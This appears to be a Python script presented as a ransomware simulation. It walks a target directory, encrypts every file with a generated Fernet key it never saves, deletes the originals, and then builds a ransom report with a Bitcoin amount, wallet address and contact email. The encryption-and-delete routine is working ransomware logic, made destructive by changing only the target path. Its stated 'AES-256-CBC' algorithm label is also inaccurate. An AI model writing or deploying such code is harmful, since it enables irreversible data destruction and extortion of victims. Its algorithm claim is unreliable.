import os
import random
import time
from report_generator import RansomwareReporter
from cryptography.fernet import Fernet

def simulate_encryption(target_dir):
    files_encrypted = 0
    encryption_algorithm = "AES-256-CBC"

    key = Fernet.generate_key()
    cipher = Fernet(key)

    for root, _, files in os.walk(target_dir):
        for file in files:
            if not file.endswith(".encrypted"):
                old_path = os.path.join(root, file)
                new_path = old_path + ".encrypted"
                try:
                    with open(old_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = cipher.encrypt(data)
                    with open(new_path, 'wb') as f:
                        f.write(encrypted_data)
                    os.remove(old_path)
                    files_encrypted += 1
                    print(f"[+] Encrypted: {new_path}")
                    time.sleep(0.05)
                except Exception as e:
                    print(f"[!] Failed to encrypt: {old_path} ({e})")
    
    return files_encrypted, encryption_algorithm

if __name__ == "__main__":
    target_directory = "test_data"
    ransom_amount = "0.05 BTC"
    payment_wallet = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    contact_email = "helpdesk@lunalynx.local"
    
    encrypted_count, algorithm_used = simulate_encryption(target_directory)
    
    RansomwareReporter.generate_report(
        target_dir=target_directory,
        files_encrypted=encrypted_count,
        encryption_algorithm=algorithm_used,
        ransom_amount=ransom_amount,
        payment_wallet=payment_wallet,
        contact_email=contact_email
    )
